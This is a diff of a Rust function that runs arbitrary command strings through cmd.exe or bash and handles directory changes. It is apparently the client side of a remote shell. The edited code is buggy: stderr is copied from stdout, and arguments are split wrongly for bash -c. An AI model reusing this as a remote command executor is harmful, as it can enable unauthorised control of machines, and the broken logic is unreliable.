@@ -3,49 +3,61 @@ use std::process::{Command,exit};
 use std::io::{self, Write, BufReader, BufRead};
 use std::process::Output;
 
-fn executecmd(cmd:&str) -> String{
-    let client_os: (&str, String);
+fn executecmd(cmd: &str) -> String {
+    let client_os: (&str, &str);
     if cfg!(target_os = "windows") {
-        client_os = ("cmd.exe", "/c ".to_owned())
+        client_os = ("cmd.exe", "/c");
     } else {
-        client_os = ("/bin/bash", "-c ".to_owned())
-    };
-    let (base, temp) = client_os;
-    let fullcmd =  temp + cmd;
-    let cmds: Vec<&str> = fullcmd.split(" ").collect();
-    let extra_args: bool = if cmds.len() > 1 {
-        true
-    } else {
-        false
-    };
+        client_os = ("/bin/bash", "-c");
+    }
+    let mut cmd_parts = vec![client_os.1, cmd];
+    let extra_args: bool = cmd.contains(' ');
 
     let change_dir: bool = if extra_args {
-        cmds[1] == "cd"
+        cmd_parts[1] == "cd"
     } else {
         false
     };
+    let mut change_dir: bool = false;
+    if extra_args {
+        cmd_parts = cmd.split(" ").collect();
+        change_dir = if extra_args {
+            cmd_parts[0] == "cd"
+        } else {
+            false
+        };
+        cmd_parts.insert(0, client_os.1);
+        if let Some(last_cmd) = cmd_parts.last_mut() {
+            
+            *last_cmd = last_cmd.trim_end_matches("\r\n");
+        }   
+    }
+    else {
+        cmd_parts = cmd.split("\r").collect();
+        cmd_parts.insert(0, client_os.1);
+    }
 
     let mut stdout = String::new();
     let mut stderr = String::new();
     if change_dir {
-        let dir = cmds[2].to_string();
+        let dir = cmd_parts[2].to_string();
+        println!("Moving dir: {}",dir);
         if std::env::set_current_dir(dir.trim()).is_ok() {
             let success = "New directory:";
             stdout = [success, &dir].join(" ");
-            
         } else {
             stderr = "Could not change directory".to_owned();
         }
     } else {
-        let res: Output = Command::new(base).args(&cmds).output().unwrap();
+        let res: Output = Command::new(client_os.0).args(cmd_parts.clone()).output().unwrap();
+        println!("res is: {:?}", res);
         stdout = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
         stderr = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
     }
-    if stdout.len()>0{
-        return stdout;
-    }
-    else{
-        return stderr;
+    if stdout.len() > 0 {
+        stdout
+    } else {
+        stderr
     }
 }
 
